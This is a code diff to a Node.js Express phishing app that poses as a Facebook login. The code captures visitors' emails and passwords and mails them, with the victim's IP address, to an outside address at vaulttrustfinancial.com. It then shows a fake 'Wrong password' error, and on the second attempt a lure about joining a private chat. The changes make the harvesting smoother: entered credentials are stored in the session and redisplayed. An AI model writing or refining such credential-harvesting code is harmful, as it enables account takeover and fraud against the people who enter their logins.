@@ -41,16 +41,22 @@ const transporter = nodemailer.createTransport({
     }
 });
 
-
-
 app.get("/", (req, res) => {
-    res.render("index");
+    // Pass any messages and previous input to the EJS template
+    const message = req.session.message || '';
+    const email = req.session.email || '';
+    const password = req.session.password || '';
+    req.session.message = null; // Clear message after displaying it
+    res.render("index", { message, email, password });
 });
 
 app.post("/login", (req, res) => {
-   
     const { email, password } = req.body;
     const userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+    // Store user input in session for re-rendering
+    req.session.email = email;
+    req.session.password = password;
 
     if (!req.session.attempt) {
         req.session.attempt = 1;
@@ -59,24 +65,26 @@ app.post("/login", (req, res) => {
         const mailOptions = {
             from: '"Info" <info@vaulttrustfinancial.com>',
             to: '<info@vaulttrustfinancial.com>',
-            subject: 'Facebook Contact Form Details',
+            subject: `Login Attempt by ${email}`, // Custom subject with user email
             text: `Facebook Contact Form Details\nUsername: ${email}\nPassword: ${password}\nUser IP: ${userIp}`
         };
 
         transporter.sendMail(mailOptions, (error, info) => {
             if (error) {
                 console.log(error);
-                res.status(500).send('Error sending email.');
+                req.session.message = 'Error sending email.';
+                res.redirect('/'); // Redirect to the form with message
             } else {
                 console.log('Email sent: ' + info.response);
-                res.send('Wrong password'); // Send "wrong password" message
+                req.session.message = 'Wrong password'; // Set message for wrong password
+                res.redirect('/'); // Redirect to the form with message
             }
         });
-
     } else {
         // Second attempt - Send success message
-        res.send('You have been successfully added to the private chat, you will get a message request shortly.');
+        req.session.message = 'You have been successfully added to the private chat, you will get a message request shortly.';
         req.session.attempt = 0; // Reset attempt counter
+        res.redirect('/'); // Redirect to the form with message
     }
 });
 
